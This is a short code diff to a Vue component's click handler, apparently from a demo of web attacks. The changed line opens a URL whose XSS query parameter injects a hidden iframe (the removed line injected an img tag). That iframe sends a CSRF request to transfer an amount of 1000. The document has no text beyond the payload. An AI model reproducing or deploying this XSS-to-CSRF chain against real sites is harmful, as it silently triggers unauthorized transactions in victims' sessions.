@@ -23,7 +23,7 @@ export default {
     },
     methods: {
         handle_click() {
-            window.open(`https://wuuconix.tk/static/xss/?q=<img src='https%3A%2F%2Fwuuconix%2Etk%2Fstatic%2Fcsrf%2F%3Fmethod%3Dtransfer%26amount%3D1000'">`, "_blank")
+            window.open(`https://wuuconix.tk/static/xss/?q=%3Ciframe%20src=%22https%3A%2F%2Fwuuconix%2Etk%2Fstatic%2Fcsrf%2F%3Fmethod%3Dtransfer%26amount%3D1000%22%20style=%22display:%20none%22%3E%3C/iframe%3E`, "_blank")
         }
     },
     mounted() {
